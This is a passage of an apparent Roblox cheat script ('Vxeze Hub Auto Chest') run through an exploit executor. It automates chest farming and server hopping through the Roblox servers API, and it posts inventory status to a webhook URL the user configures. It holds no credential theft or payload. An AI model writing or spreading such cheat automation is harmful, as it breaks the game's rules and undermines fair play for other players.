                    end

                    if tick() - startTime >= 300 then
                        if _G.CurrentTween then
                            _G.CurrentTween:Cancel()
                            _G.CurrentTween = nil
                        end    
                            
                        game:GetService("StarterGui"):SetCore("SendNotification", {
                            Title = "Vxeze Hub Auto Chest",
                            Text = "Zzz. Hop Sever",
                            Duration = 4
                        })
                        StartCountdownAndHop(10)
                        startTime = tick()    
                        break
                    end
                end
            end

            AutoChestCollect()
        end
        wait(1)
    end
end)

--HOP Server
function Hop()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour

    function TPReturner()
        local Site
        if foundAnything == "" then
            Site = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. foundAnything))
        end

        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end

        for _, v in pairs(Site.data) do
            local ID = tostring(v.id)
            local Possible = true

            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _, Existing in pairs(AllIDs) do
                    if ID == tostring(Existing) then
                        Possible = false
                        break
                    end
                end

                if Possible then
                    table.insert(AllIDs, ID)
                    wait(1)
                    pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait(4)
                    return
                end
            end
        end
    end

    function Teleport()
        while true do
            pcall(function()
                TPReturner()
                if foundAnything ~= "" then
                    TPReturner()
                end
            end)
            wait(5)
        end
    end

    Teleport()
end

--Post Webhook
spawn(function()
    while true do
        local hasGodsChalice = false
        local hasFistOfDarkness = false

        for _, item in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if item.Name == "God's Chalice" then
                hasGodsChalice = true
            elseif item.Name == "Fist of Darkness" then
                hasFistOfDarkness = true
            end
        end

        if getgenv().config.Webhook["Send Webhook"] then
            PostWebhook(getgenv().config.Webhook["Webhook Url"], AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness))
        end
            
        task.wait(60)
    end
end)
